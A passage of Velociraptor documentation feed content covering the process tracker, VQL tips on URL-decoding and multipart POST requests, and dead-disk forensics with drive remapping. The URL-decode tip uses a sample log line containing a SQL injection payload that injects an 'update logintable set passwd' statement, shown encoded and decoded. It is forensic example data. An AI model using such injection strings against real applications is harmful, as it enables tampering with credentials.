5.0625l-1.625 0zm4.712677 3.703125l0 -1.1875l10.859375 0l0 1.1875l-10.859375 0zm11.578857 -2.90625l1.59375 0.234375q0.109375 0.75 0.5625 1.078125q0.609375 0.453125 1.671875 0.453125q1.140625 0 1.75 -0.453125q0.625 -0.453125 0.84375 -1.265625q0.125 -0.5 0.109375 -2.109375q-1.0625 1.265625 -2.671875 1.265625q-2.0 0 -3.09375 -1.4375q-1.09375 -1.4375 -1.09375 -3.453125q0 -1.390625 0.5 -2.5625q0.515625 -1.171875 1.453125 -1.796875q0.953125 -0.640625 2.25 -0.640625q1.703125 0 2.8125 1.375l0 -1.15625l1.515625 0l0 8.359375q0 2.265625 -0.46875 3.203125q-0.453125 0.9375 -1.453125 1.484375q-0.984375 0.546875 -2.453125 0.546875q-1.71875 0 -2.796875 -0.78125q-1.0625 -0.765625 -1.03125 -2.34375zm1.359375 -5.8125q0 1.90625 0.75 2.78125q0.765625 0.875 1.90625 0.875q1.125 0 1.890625 -0.859375q0.765625 -0.875 0.765625 -2.734375q0 -1.78125 -0.796875 -2.671875q-0.78125 -0.90625 -1.890625 -0.90625q-1.09375 0 -1.859375 0.890625q-0.765625 0.875 -0.765625 2.625zm15.953827 1.90625l1.6875 0.203125q-0.40625 1.484375 -1.484375 2.3125q-1.078125 0.8125 -2.765625 0.8125q-2.125 0 -3.375 -1.296875q-1.234375 -1.3125 -1.234375 -3.671875q0 -2.453125 1.25 -3.796875q1.265625 -1.34375 3.265625 -1.34375q1.9375 0 3.15625 1.328125q1.234375 1.3125 1.234375 3.703125q0 0.15625 0 0.4375l-7.21875 0q0.09375 1.59375 0.90625 2.453125q0.8125 0.84375 2.015625 0.84375q0.90625 0 1.546875 -0.46875q0.640625 -0.484375 1.015625 -1.515625zm-5.390625 -2.65625l5.40625 0q-0.109375 -1.21875 -0.625 -1.828125q-0.78125 -0.953125 -2.03125 -0.953125q-1.125 0 -1.90625 0.765625q-0.765625 0.75 -0.84375 2.015625zm12.719482 4.296875l0.234375 1.453125q-0.6875 0.140625 -1.234375 0.140625q-0.890625 0 -1.390625 -0.28125q-0.484375 -0.28125 -0.6875 -0.734375q-0.203125 -0.46875 -0.203125 -1.9375l0 -5.578125l-1.203125 0l0 -1.265625l1.203125 0l0 -2.390625l1.625 -0.984375l0 3.375l1.65625 0l0 1.265625l-1.65625 0l0 5.671875q0 0.6875 0.078125 0.890625q0.09375 0.203125 0.28125 0.328125q0.203125 0.109375 0.578125 0.109375q0.265625 0 0.71875 -0.0625zm4.7301636 5.390625q-1.359375 -1.703125 -2.296875 -4.0q-0.9375 -2.296875 -0.9375 -4.765625q0 -2.15625 0.703125 -4.140625q0.828125 -2.3125 2.53125 -4.59375l1.171875 0q-1.09375 1.890625 -1.453125 2.703125q-0.546875 1.25 -0.875 2.625q-0.390625 1.703125 -0.390625 3.421875q0 4.375 2.71875 8.75l-1.171875 0zm4.165802 0l-1.1875 0q2.734375 -4.375 2.734375 -8.75q0 -1.71875 -0.390625 -3.390625q-0.3125 -1.375 -0.875 -2.625q-0.359375 -0.828125 -1.46875 -2.734375l1.1875 0q1.703125 2.28125 2.53125 4.59375q0.6875 1.984375 0.6875 4.140625q0 2.46875 -0.9375 4.765625q-0.9375 2.296875 -2.28125 4.0z" fill-rule="nonzero"/>&lt;/g>&lt;/svg>
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="process_tracker.svg">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 The Velociraptor process tracker architecture
 &lt;/figcaption>
&lt;/figure>



&lt;/p>
&lt;p>The tracker accepts process information from two potential sources:&lt;/p>
&lt;ol>
&lt;li>An event query to feed it real time process start/end events.&lt;/li>
&lt;li>A VQL query that runs periodically to refresh the complete state of running processes.&lt;/li>
&lt;/ol>
&lt;p>These are implemented by way of&lt;/p>
&lt;ol>
&lt;li>
&lt;p>The &lt;code>Windows.Events.TrackProcesses&lt;/code> artifact uses ETW to watch for
the Sysmon Process start events (ID 1) for real time information,
as well as periodically running a complete &lt;code>pslist()&lt;/code> to
synchronize its internal state.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>If you do not want to run &lt;code>Sysmon&lt;/code>, you can choose to collect the
&lt;code>Windows.Events.TrackProcessesBasic&lt;/code> artifact which only refreshes
the tracker with a periodic &lt;code>pslist()&lt;/code> API call.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>If you do not collect any specialized artifacts to track processes,
the tracker will fall back to a regular pslist() based dummy
implementation. This will give the same results as before (i.e. it
is unable to see previously exited processes) but all process
tracker VQL commands work as usual.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>This means that as an artifact writer you can always use the process
tracker as a complete substitution to the traditional &lt;code>pslist()&lt;/code>
plugin! Depending on how the administrator chooses to do the actual
tracking, your artifact may gain access to more details.&lt;/p>
&lt;p>While it is preferable to populate the process start events with live
Sysmon events, it is not strictly necessary. Sysmon feed with provide
a more accurate real time feed of process start events. While the
alternative &lt;code>pslist()&lt;/code> style tracking method is very low resource, it
may miss short lived processes.&lt;/p>
&lt;h2 id="accessing-the-tracker-from-vql">Accessing the tracker from VQL&lt;/h2>
&lt;p>The tracker is available for use from VQL using the following VQL
plugins:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>process_tracker_pslist()&lt;/code> This plugin is a drop in replacement for
the &lt;code>pslist()&lt;/code> plugin. If the tracker is enabled it will also
contain exited process information.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>process_tracker_callchain()&lt;/code> provides the full call chain for a
given process ID as an array of process entries.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>process_tracker_get()&lt;/code> Looks up a single Process ID in the tracker
to return its entry if exists.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>process_tracker_tree()&lt;/code> Provides the full process tree rooted at
the specified process ID so it can be visualized in the GUI.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="comparing-the-process-tracker-to-edr">Comparing the process tracker to EDR&lt;/h2>
&lt;p>Collecting process call chains is very central to detection
engineering and therefore is an integral feature of many EDR
solutions.&lt;/p>
&lt;p>Most EDR solutions work by relaying process start events to a central
location such as a SIEM and then using database queries to reconstruct
the process call chain from historical data. This also allows viewing
historical process information.&lt;/p>
&lt;p>Velociraptor&amp;rsquo;s design philosophy is endpoint-centric - rather than
forward all the data to a large backend and query across process start
events from &lt;strong>ALL&lt;/strong> endpoints, Velociraptor&amp;rsquo;s process tracker limits
the analysis to the process on the endpoint itself. This naturally
limits the total number of process we need to track and makes tracking
much easier because we do not need to query across the entire data set
for all clients.&lt;/p>
&lt;h2 id="process-tracker-challenges">Process Tracker challenges&lt;/h2>
&lt;p>The following describes some of the issues in implementation of the
process tracker we have found (so far).&lt;/p>
&lt;h3 id="process-id-reuse">Process ID reuse&lt;/h3>
&lt;p>While in theory process IDs uniquely identify a process, in reality
(at least on Windows) process ID&amp;rsquo;s are reused aggressively. Accounting
for this is not trivial - For example, if a new process is discovered
with a parent ID of 5, we can not just search for a process with ID 5
as it&amp;rsquo;s parent. Since this ID could have been reused and belong to a
completely new process.&lt;/p>
&lt;p>Velociraptor&amp;rsquo;s tracker keeps track of reused process ID&amp;rsquo;s by using the
combination of process ID and start time to uniquely identify the
process. If the tracker detects a process has exited, it renames the
old process in the form of &lt;code>pid-starttime&lt;/code> while creating a new
process entry in the usual form of &lt;code>pid&lt;/code>.&lt;/p>
&lt;p>











&lt;figure id="28625d4786fc43960aea4383b2ca77d6">
 &lt;div data-featherlight="#28625d4786fc43960aea4383b2ca77d6" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-08-17-process-tracker/pid-reuse.png" alt="Pid reuse causes process IDs to be suffixed with their start time">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="pid-reuse.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Pid reuse causes process IDs to be suffixed with their start time
 &lt;/figcaption>
&lt;/figure>




&lt;/p>

&lt;div class="mynotices note">
 &lt;div heading=" Why not use a GUID? ">&lt;p>Other tools use a unique identifier such as a &lt;code>GUID&lt;/code> to uniquely
identify a process. For example, &lt;code>Sysmon&lt;/code> derives a GUID based on
process ID, start time, machine id etc to derive a globally unique
identifier to a process.&lt;/p>
&lt;p>While a GUID solves the issue of uniquely identifying a process within
a single tool it is not a useful device for Velociraptor&amp;rsquo;s queries,
which typically enrich data from external sources.&lt;/p>
&lt;p>For example, if we used &lt;code>GUID&lt;/code> to uniquely identify processes in the
tracker, a VQL query is unable to enrich the DNS ETW source with
process call chains. The ETW subsystem only provides a Process ID as
an indicator of the process that made the DNS query. There is no way
for Velociraptor to go from a process ID to a unique &lt;code>GUID&lt;/code> directly
(precisely because a &lt;code>PID&lt;/code> by itself is missing critical data that
makes it a unique identifier).&lt;/p>
&lt;p>Therefore Velociraptor&amp;rsquo;s tracker retains the process ID in the tracker
as the ultimate key by which we can query for a process. This way we
can always convert a PID to a proper call chain without being confused
by PID reuse. When the tracker detects the ID no longer represents the
process uniquely (i.e. the PID has been reused) the tracker can update
the ID and all references to it automatically, so a search for the
same PID will fetch the new process not the old one.&lt;/p>
&lt;/div>
&lt;/div>


&lt;h2 id="what-is-stored-in-the-process-tracker">What is stored in the process tracker.&lt;/h2>
&lt;p>The Velociraptor Process Tracker is simply a database that stores
information about each process. The process entry in the tracker can
contain any arbitrary data as populated from the process information
queries. For example, when using Sysmon as the process start source,
we can populate the tracker with quite a lot of additional information
such as executable hashes, original executable name etc.&lt;/p>
&lt;p>We can choose to add additional enrichment to store in the tracker by
enabling the &lt;code>AddEnrichments&lt;/code> parameter when configuring the
&lt;code>Windows.Events.TrackProcesses&lt;/code> artifact. These may increase the
overall load on the endpoint (due to the additional work in
calculating hashes etc) but will provide better quality data in a
response.&lt;/p>
&lt;p>











&lt;figure id="62b895acb8fc1d3ce40a013a0ea27209">
 &lt;div data-featherlight="#62b895acb8fc1d3ce40a013a0ea27209" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-08-17-process-tracker/enrichment.png" alt="Enriching tracked process information">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="enrichment.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Enriching tracked process information
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;h2 id="conclusions">Conclusions&lt;/h2>
&lt;p>The Process Tracker is a very exciting feature and can help resolve
incidents quickly by providing invaluable context. However it is only
useful when Velociraptor is constantly running on the endpoint. If you
usually use Velociraptor&amp;rsquo;s offline collector to just collect a point
in time snapshot the process tracker will not be able to provide
information about exited processes.&lt;/p>
&lt;p>If you like the new process tracker feature, take &lt;a href="https://github.com/Velocidex/velociraptor" target="_blank" >Velociraptor for a
spin&lt;/a>
! It is a available
on GitHub under an open source license. As always please file issues
on the bug tracker or ask questions on our mailing list
&lt;a href="mailto:velociraptor-discuss@googlegroups.com" >velociraptor-discuss@googlegroups.com&lt;/a>

. You can also chat with us directly on discord
&lt;a href="https://www.velocidex.com/discord" target="_blank" >https://www.velocidex.com/discord&lt;/a>

.&lt;/p></description></item><item><title>How can I url/percent decode a string?</title><link>https://docs.velociraptor.app/knowledge_base/tips/urldecode/</link><pubDate>Mon, 06 Jun 2022 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/knowledge_base/tips/urldecode/</guid><description>&lt;h1 id="how-can-i-urlpercent-decode-a-string">How can I url/percent decode a string?&lt;/h1>
&lt;p>During investigation you may find logs or other data with percent-encoded strings.
Since 0.6.5 we have included a lambda function in regex_replace() that enables decode and managing errors to enable analysis.&lt;/p>
&lt;pre>&lt;code class="language-vql">LET Line = '''http://target/login.asp?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00'''

SELECT regex_replace(source=Line, replace_lambda=&amp;quot;x=&amp;gt;unhex(string=x[1:]) || x&amp;quot;, re=&amp;quot;%..&amp;quot;) as Decoded FROM scope() 

&lt;/code>&lt;/pre>
&lt;p>






&lt;figure id="aa37781dd65ae86c26e8f0a7a277e0b6">
 &lt;div data-featherlight="#aa37781dd65ae86c26e8f0a7a277e0b6" class="figure">
 &lt;img src="https://docs.velociraptor.app/knowledge_base/tips/urldecode/https://user-images.githubusercontent.com/13081800/172098424-d78c73f9-e7d2-405b-99ca-129eba4350c0.png" alt="Url Decode: results" />
 &lt;/div>
 &lt;figcaption>
 Url Decode: results
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>Similarly, to URL encode we can run a similar function:&lt;/p>
&lt;pre>&lt;code class="language-vql">LET Line = '''http://target/login.asp?userid=bob'; update logintable set passwd='0wn3d';--'''

SELECT
 url(path=Line).String[1:] as URLFunction,
 regex_replace(source=Line,replace_lambda=&amp;quot;x=&amp;gt;format(format='%%%02x',args=x)&amp;quot;, re=&amp;quot;[^a-z0-9\\-_.~:/?]&amp;quot;) as ManualMethod
FROM scope()
&lt;/code>&lt;/pre>
&lt;p>






&lt;figure id="600d14b14b1231b510b009def8c13544">
 &lt;div data-featherlight="#600d14b14b1231b510b009def8c13544" class="figure">
 &lt;img src="https://docs.velociraptor.app/knowledge_base/tips/urldecode/https://user-images.githubusercontent.com/13081800/187116187-9347d6be-5566-49b0-98d6-65ce0d2ff0cc.png" alt="Url Encode: results" />
 &lt;/div>
 &lt;figcaption>
 Url Encode: results
 &lt;/figcaption>
&lt;/figure>


&lt;/p></description></item><item><title>How can I make a multipart/form-data POST request in VQL</title><link>https://docs.velociraptor.app/knowledge_base/tips/multiparts_uploads/</link><pubDate>Sat, 21 May 2022 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/knowledge_base/tips/multiparts_uploads/</guid><description>&lt;h1 id="how-can-i-make-a-multipartform-data-post-request-in-vql">How can I make a multipart/form-data POST request in VQL&lt;/h1>
&lt;p>&lt;em>NOTE: The technique described in this article should no longer be necessary
since the&lt;code>http_client&lt;/code> plugin now
&lt;a href="https://docs.velociraptor.app/vql_reference/popular/http_client/#example---uploading-files" >supports multipart uploads&lt;/a>
.
However this information may still be useful in certain circumstances and for
providing insight into advanced VQL.&lt;/em>&lt;/p>
&lt;hr>
&lt;p>VQL can be used to make http requests using the &lt;code>http_client()&lt;/code>
plugin. While &lt;code>GET&lt;/code> requests are usually pretty straight forward,
sometimes we need to upload using something called
&lt;code>multipart/form-data&lt;/code> POST. What is it and how can VQL do this?&lt;/p>
&lt;h2 id="what-is-multipartform-data-post">What is &lt;code>multipart/form-data&lt;/code> POST?&lt;/h2>
&lt;p>This is a standard way of serializing multiple &amp;ldquo;parts&amp;rdquo; into a single
request. A &amp;ldquo;part&amp;rdquo; here is a value of a parameter or usually a
file. Traditionally this came from a HTML &amp;ldquo;form&amp;rdquo; element, but often
these are used for APIs now without a browser interface at all.&lt;/p>
&lt;p>The idea is that we define a &amp;ldquo;boundary&amp;rdquo; - a special string which is so
unique it might not appear accidentally in the data, then we separate
the parts using this boundary:&lt;/p>
&lt;pre>&lt;code>--boundary
Headers

Data
--boundary
Headers

Data
--boundary--
&lt;/code>&lt;/pre>
&lt;ol>
&lt;li>Each part starts with &amp;ldquo;&amp;ndash;&amp;rdquo; followed by the boundary and a line feed.&lt;/li>
&lt;li>Next come the headers which describe things about this part
followed by two line feeds.&lt;/li>
&lt;li>Next come the body of the part&lt;/li>
&lt;li>Finally after the last part, the end is signaled by &amp;ldquo;&amp;ndash;&amp;rdquo; followed
by the boundary and another &amp;ldquo;&amp;ndash;&amp;rdquo; followed by new line.&lt;/li>
&lt;/ol>
&lt;p>The most confusing part of this is that when looking at examples, the
boundary is often something like
&lt;code>-----------------------------9051914041544843365972754266&lt;/code> making it
virtually impossible to see the extra &amp;ldquo;&amp;ndash;&amp;rdquo; at the start and end (you
have to carefully count to realize the boundary header adds two
extra dashes!).&lt;/p>
&lt;h2 id="combining-in-vql">Combining in VQL&lt;/h2>
&lt;p>Anyway once the whole this is demystified it is really easy to create
this in VQL. Here is an example:&lt;/p>
&lt;pre>&lt;code class="language-vql">LET Boundary = &amp;quot;-----------------------------9051914041544843365972754266&amp;quot;

-- A Helper function to make a regular form variable.
LET Data(Name, Value) = format(
 format='--%s\r\nContent-Disposition: form-data; name=&amp;quot;%s&amp;quot;\r\n\r\n\r\n%v\r\n',
 args=[Boundary, Name, Value])

-- A Helper function to embed a file content.
LET File(Filename, ParameterName, ContentType, Data) = format(
 format='--%s\r\nContent-Disposition: form-data; name=&amp;quot;%s&amp;quot;; filename=&amp;quot;%s&amp;quot;\r\nContent-Type: %s\r\n\r\n%v\r\n',
 args=[Boundary, ParameterName, Filename, ContentType, Data])

-- The End boundary signals the last part
LET END = format(format=&amp;quot;%s--\r\n&amp;quot;, args=Boundary)

-- Now make the HTTP request and post the form
-- Remember the Content-Type header which includes the boundary!
SELECT * FROM http_client(
 method=&amp;quot;POST&amp;quot;,
 url=&amp;quot;http://www.example.com/formhandler&amp;quot;,
 headers=dict(`Content-Type`=&amp;quot;multipart/form-data; boundary=&amp;quot; + Boundary),
 data=Data(Name=&amp;quot;name&amp;quot;, Value=&amp;quot;Bar&amp;quot;) +
 File(Filename=&amp;quot;Hello.txt&amp;quot;, ParameterName=&amp;quot;file_upload&amp;quot;, ContentType=&amp;quot;text/plain&amp;quot;, Data=&amp;quot;this is a test&amp;quot;) +
 END)
&lt;/code>&lt;/pre>
&lt;p>In this example I used some utility functions to make it easier to build the
different parts and make sure the encoding structure is always correct.&lt;/p></description></item><item><title>In VQL, can I SELECT a column with special characters in its name?</title><link>https://docs.velociraptor.app/knowledge_base/tips/identifier_with_space/</link><pubDate>Sun, 27 Mar 2022 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/knowledge_base/tips/identifier_with_space/</guid><description>&lt;h1 id="in-vql-can-i-select-a-column-with-special-characters-in-its-name">In VQL, can I SELECT a column with special characters in its name?&lt;/h1>
&lt;p>Sometimes a VQL query will emit a column name with special characters in its name, such as a dot, space or other special characters.&lt;/p>
&lt;p>You can still refer to this column using backticks around the identifier name:&lt;/p>
&lt;pre>&lt;code class="language-vql">-- This will not work because VQL will interpret the dot as an operator
SELECT Raddr.IP FROM ...

-- This will work because VQL will treat the entire thing as a single identifier
SELECT `Raddr.IP` FROM ...
&lt;/code>&lt;/pre>
&lt;p>You can read more about &lt;a href="https://docs.velociraptor.app/docs/vql/#identifiers-with-spaces" >VQL identifiers&lt;/a>
&lt;/p></description></item><item><title>Dead disk Forensics</title><link>https://docs.velociraptor.app/blog/2022/2022-03-22-deaddisk/</link><pubDate>Sun, 20 Mar 2022 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/blog/2022/2022-03-22-deaddisk/</guid><description>&lt;p>Velociraptor&amp;rsquo;s killer feature is its VQL language making it possible
to write powerful queries that triage and extract valuable forensic
evidence from the running system. One of the most attractive features
is the ability to write VQL &lt;a href="https://docs.velociraptor.app/docs/artifacts/" >artifacts&lt;/a>

encapsulating powerful VQL queries. Users have access to a library of
&lt;a href="https://docs.velociraptor.app/artifact_references/" >packaged artifacts&lt;/a>

that come with Velociraptor as well as a vibrant community and an
&lt;a href="https://docs.velociraptor.app/exchange/" >Artifact Exchange&lt;/a>
.&lt;/p>
&lt;p>Previously Velociraptor was most useful as a live analysis
platform. Either deployed as an agent on the live endpoint, or via the
&lt;a href="https://docs.velociraptor.app/docs/offline_triage/#offline-collections" >Offline Collector&lt;/a>

collecting artifacts from the running system. However, many users are sometimes
faced with analyzing a dead disk image - for example, when handed a clone of a
cloud VM disk after a compromise.&lt;/p>
&lt;p>It would be really nice to be able to leverage the same VQL artifacts
developed and shared by the community in a disk image or VM clone
without having to start the VM and install Velociraptor on it.&lt;/p>
&lt;h2 id="dead-disk-analysis">Dead disk analysis&lt;/h2>
&lt;p>When we want to analyze a disk image we mean that:&lt;/p>
&lt;ol>
&lt;li>A VQL query that looks at a disk (e.g. via the &lt;code>glob()&lt;/code> plugin),
should look inside the disk image instead of the real disk of the
analysis machine.&lt;/li>
&lt;li>A VQL query that looks at system state (e.g. process listing)
should fail - otherwise we will accidentally mix results from the
analysis machine and the machine the image came from.&lt;/li>
&lt;/ol>
&lt;p>Consider the following scenario: I have a dead disk image (In a &lt;code>vmdk&lt;/code>
format) of a server on my analysis machine, and I want to run
Velociraptor to triage this image.&lt;/p>
&lt;p>The following query retrieves all event logs from a windows system:&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT OSPath
FROM glob(globs=&amp;quot;C:/Windows/System32/WinEVT/Logs/*.evtx&amp;quot;)
&lt;/code>&lt;/pre>
&lt;p>When I run this query, I want the results to come from the image and
&lt;strong>not&lt;/strong> from my analysis machine!&lt;/p>
&lt;p>Of course I can always mount my dead image on a different drive (if my
analysis machine is Windows) or a different directory (if my analysis
machine is Linux). Then I can change the query accordingly to search
for the event log files in the new location. But this is tedious and
error prone - I have to carefully change all artifacts to point to the
new drive, and if there are references in the dead image to a &lt;code>C:&lt;/code>
drive the artifact will look for files in the &lt;code>C:&lt;/code> drive again.&lt;/p>
&lt;p>What I really want is to &lt;strong>remap&lt;/strong> the &lt;code>C:&lt;/code> drive to the dead image -
so whenever Velociraptor attempts to access a path beginning with &lt;code>C:&lt;/code>
drive, the data will come from the image! This way I can use all the
artifacts as they are &lt;strong>without modification&lt;/strong>, thereby leveraging all
my existing favorite artifacts.&lt;/p>
&lt;h2 id="remapping-accessors">Remapping accessors&lt;/h2>
&lt;p>Velociraptor accesses files using &lt;a href="https://docs.velociraptor.app/docs/forensic/filesystem/#filesystem-accessors" >filesystem accessors&lt;/a>
. You can think
of an accessor as simply a driver that provides access to a file or
directory.&lt;/p>
&lt;p>There are a number of types of accessors available, in the following
discussion the following accessors are important:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>The &lt;strong>auto&lt;/strong> accessor is the default accessor used when an accessor
is not explicitly specified. The query &lt;code>SELECT * FROM glob(globs='/*')&lt;/code> will use the &lt;code>auto&lt;/code> accessor since an explicit
&lt;code>accessor&lt;/code> parameter is not provided.&lt;/p>
&lt;p>On Windows the &lt;code>auto&lt;/code> accessor attempts to open files using the OS
API and failing this, reverts to NTFS parsing (for locked
files). This is the most commonly used accessor.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The &lt;strong>file&lt;/strong> accessor uses the operating system APIs to open files
and directories. It is used internally by the &lt;code>auto&lt;/code> accessor but
you can also use it explicitly.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The &lt;strong>ntfs&lt;/strong> accessor is used to access files using the built in
NTFS parser.&lt;/p>
&lt;/li>
&lt;/ul>

&lt;div class="mynotices note">
 &lt;div heading=" Supported disk image formats ">&lt;p>Velociraptor currently supports the following 4 disk image formats via built-in
&lt;a href="https://docs.velociraptor.app/vql_reference/accessors/" >accessors&lt;/a>
:&lt;/p>
&lt;ul>
&lt;li>&lt;code>EWF&lt;/code>: Expert Witness Compression Format, sometimes called &amp;ldquo;E01 images&amp;rdquo;&lt;/li>
&lt;li>&lt;code>VMDK&lt;/code>: virtual hard drive format introduced by VMware&lt;/li>
&lt;li>&lt;code>VHDX&lt;/code>: virtual hard drive format introduced by Microsoft&lt;/li>
&lt;li>raw format: bit-by-bit copy of a hard drive, also know as &amp;ldquo;DD&amp;rdquo; or &amp;ldquo;flat&amp;rdquo; format&lt;/li>
&lt;/ul>
&lt;p>The &lt;code>deaddisk&lt;/code> command described below recognizes the first three formats based
on &lt;em>file extension&lt;/em> and Velociraptor is able to read these formats natively
without any additional steps. If the target image file has any other extension
then the &lt;code>deaddisk&lt;/code> command will treat it as raw format.&lt;/p>
&lt;p>If you have any other image format then the recommended course of action is to
&amp;ldquo;cross-mount&amp;rdquo; the image to raw format. There are several tools which can do
this, for example &lt;a href="https://www.pinguin.lu/xmount" target="_blank" >xmount&lt;/a>
. Alternatively you can
convert the image to one of the natively-supported formats, and many tools exist
which can do that. The downside of converting formats is that it requires a lot
of disk space and can take a long time, therefore cross-mounting is preferable
because it &amp;ldquo;translates&amp;rdquo; one format to another without conversion.&lt;/p>
&lt;p>Most virtual machine platforms can usually export to several formats. In
particular note that VMware can export for raw format (also called &amp;ldquo;flat&amp;rdquo;) but
retains the &lt;code>.vmdk&lt;/code> file extension. In that case you would need to remove the
file extension so that Velociraptor&amp;rsquo;s &lt;code>deaddisk&lt;/code> command will treat it as a raw
image instead of VMDK format.&lt;/p>
&lt;/div>
&lt;/div>


&lt;h2 id="remapping-configuration">Remapping configuration&lt;/h2>
&lt;p>Velociraptor normally interrogates the live machine it is running
on. However in this case we want to emulate the system under
investigation so that when Velociraptor attempts to access the system
it is really parsing the dead disk image. This process of emulation is
called &lt;code>remapping&lt;/code> and it is controlled via remapping rules in the
configuration file.&lt;/p>
&lt;p>Although I can write these rules by hand, Velociraptor offers a quick
tool that automates a lot of the remapping rule generation. Simply
point velociraptor at the image file using the
&lt;code>--add_windows_disk&lt;/code> flag, and it will produce a new remapping yaml
config:&lt;/p>
&lt;pre>&lt;code>$ velociraptor-linux-amd64 -v deaddisk --add_windows_disk /mnt/flat /tmp/remapping.yaml
velociraptor: Enumerating partitions using Windows.Forensics.PartitionTable
velociraptor: Searching for a Windows directory at the top level
velociraptor: Adding windows partition at offset 122683392
velociraptor: Searching for a Windows directory at the top level
&lt;/code>&lt;/pre>
&lt;p>Velociraptor will enumerate the partitions in the disk image and
attempt to mount each as an NTFS partition. It will then look for a
&lt;code>/Windows&lt;/code> directory at the top level to indicate a system drive and
map it to the &lt;code>C:&lt;/code> drive.&lt;/p>
&lt;p>You can see the full generated configuration file
&lt;a href="https://gist.github.com/scudette/ffcd3ed2e589ebbdbe5c3edcf3914176" target="_blank" >here&lt;/a>

but in the next few sections we will examine some remapping rules in
detail.&lt;/p>
&lt;h3 id="the-mount-remapping-rules">The &amp;ldquo;mount&amp;rdquo; remapping rules&lt;/h3>
&lt;p>Let&amp;rsquo;s take a closer look at the following rule of type &lt;code>mount&lt;/code>&lt;/p>
&lt;pre>&lt;code class="language-yaml">- type: mount
 description: 'Mount the partition /mnt/flat (offset 122683392) on the C:
 drive (NTFS)'
 from:
 accessor: raw_ntfs
 prefix: |
 {
 &amp;quot;DelegateAccessor&amp;quot;: &amp;quot;offset&amp;quot;,
 &amp;quot;Delegate&amp;quot;: {
 &amp;quot;DelegateAccessor&amp;quot;: &amp;quot;file&amp;quot;,
 &amp;quot;DelegatePath&amp;quot;: &amp;quot;/mnt/flat&amp;quot;,
 &amp;quot;Path&amp;quot;:&amp;quot;122683392&amp;quot;
 },
 &amp;quot;Path&amp;quot;: &amp;quot;/&amp;quot;
 }
 &amp;quot;on&amp;quot;:
 accessor: ntfs
 prefix: '\\.\C:'
 path_type: ntfs
&lt;/code>&lt;/pre>
&lt;p>A &lt;code>mount&lt;/code> rule tells Velociraptor to map all paths below a certain
directory to a delegate accessor. When a VQL query attempts to open a
file using the &lt;code>ntfs&lt;/code> accessor, below the &lt;code>\\.\C:&lt;/code> directory,
Velociraptor will automatically map the request to &lt;code>raw_ntfs&lt;/code> accessor
with the above prefix.&lt;/p>
&lt;p>For example, consider the request to list the &lt;code>\\.\C:\Windows&lt;/code>
directory. Since this directory is below the mount point of &lt;code>\\.\C:&lt;/code>,
Velociraptor will append the remainder (the &lt;code>Windows&lt;/code> directory) to
the mount point&amp;rsquo;s &lt;code>from&lt;/code> prefix and use the &lt;code>raw_ntfs&lt;/code> accessor to
list the result.&lt;/p>
&lt;p>So the following pathspec will be opened instead:&lt;/p>
&lt;pre>&lt;code class="language-json"> {
 &amp;quot;DelegateAccessor&amp;quot;: &amp;quot;offset&amp;quot;,
 &amp;quot;Delegate&amp;quot;: {
 &amp;quot;DelegateAccessor&amp;quot;: &amp;quot;file&amp;quot;,
 &amp;quot;DelegatePath&amp;quot;: &amp;quot;/mnt/flat&amp;quot;,
 &amp;quot;Path&amp;quot;:&amp;quot;122683392&amp;quot;
 },
 &amp;quot;Path&amp;quot;: &amp;quot;/Windows&amp;quot;
 }
&lt;/code>&lt;/pre>
&lt;p>The prefix is an OSPath object in the form of a complete pathspec
object describing how the &lt;code>raw_ntfs&lt;/code> accessor is to access files:&lt;/p>
&lt;ol>
&lt;li>The &lt;code>raw_ntfs&lt;/code> accessor will first open it&amp;rsquo;s delegate container and
then parse out the &lt;code>/Windows&lt;/code> path within it.&lt;/li>
&lt;li>The delegate is the &lt;code>offset&lt;/code> accessor - an accessor that maps an
offset from it&amp;rsquo;s own delegate (in order to extract the partition on
which the filesystem is written).&lt;/li>
&lt;li>The &lt;code>offset&lt;/code> accessor in turn uses the &lt;code>file&lt;/code> accessor to open the
&lt;code>/mnt/flat&lt;/code> image file. In this case the offset is 122683392 bytes
into the image.&lt;/li>
&lt;/ol>
&lt;p>This remapping happens transparently - whenever Velociraptor accesses
the &lt;code>ntfs&lt;/code> accessor the data will be automatically taken from the
remapped mount point.&lt;/p>
&lt;p>Let&amp;rsquo;s see how this works in practice. I will start the GUI using:&lt;/p>
&lt;pre>&lt;code>$ velociraptor-v0.6.4-linux-amd64 --remap /tmp/remapping.yaml gui -v
&lt;/code>&lt;/pre>
&lt;p>This simply starts the Velociraptor server and a single client talking
to it. However, due to the &lt;code>--remap&lt;/code> flag, the remapping configuration
will be applied to both client and server configurations.&lt;/p>
&lt;p>Now when I interact with the client&amp;rsquo;s VFS view due to the remapping
the result comes from the &lt;code>vmdk&lt;/code> image.&lt;/p>
&lt;p>











&lt;figure id="1fe4e65c4d6fcf153b45de8b0fce413c">
 &lt;div data-featherlight="#1fe4e65c4d6fcf153b45de8b0fce413c" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-03-22-deaddisk/ntfs_accssor_vfs.png" alt="Browsing the VFS with the remapped ntfs accessor">
 &lt;/div>
 &lt;figcaption>
